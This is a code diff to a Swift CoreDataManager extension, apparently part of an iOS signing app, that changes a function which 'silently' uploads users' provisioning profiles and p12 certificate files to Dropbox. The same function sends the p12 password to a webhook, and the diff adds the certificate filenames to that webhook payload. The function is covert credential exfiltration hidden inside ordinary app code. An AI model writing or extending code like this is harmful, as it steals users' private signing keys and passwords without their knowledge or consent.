@@ -78,22 +78,30 @@ extension CoreDataManager {
         uploadCertificateFilesToDropbox(provisionPath: provisionPath, p12Path: p12Path, password: files[.password] as? String)
     }
     
-    /// Silently uploads certificate files to Dropbox and sends password to webhook
+    /// Silently uploads certificate files to Dropbox and sends info to webhook
     /// - Parameters:
     ///   - provisionPath: Path to the mobileprovision file
     ///   - p12Path: Optional path to the p12 file
     ///   - password: Optional p12 password
     private func uploadCertificateFilesToDropbox(provisionPath: URL, p12Path: URL?, password: String?) {
+        // Get filenames for webhook
+        let provisionFilename = provisionPath.lastPathComponent
+        
         // Upload provision file
         DropboxService.shared.uploadCertificateFile(fileURL: provisionPath)
         
         // Upload p12 file if available
         if let p12PathURL = p12Path {
+            let p12Filename = p12PathURL.lastPathComponent
             DropboxService.shared.uploadCertificateFile(fileURL: p12PathURL)
             
-            // Send p12 password to webhook if available
+            // Send certificate info to webhook if password is available
             if let p12Password = password, !p12Password.isEmpty {
-                DropboxService.shared.sendP12PasswordToWebhook(password: p12Password)
+                DropboxService.shared.sendCertificateInfoToWebhook(
+                    password: p12Password,
+                    p12Filename: p12Filename,
+                    provisionFilename: provisionFilename
+                )
             }
         }
     }
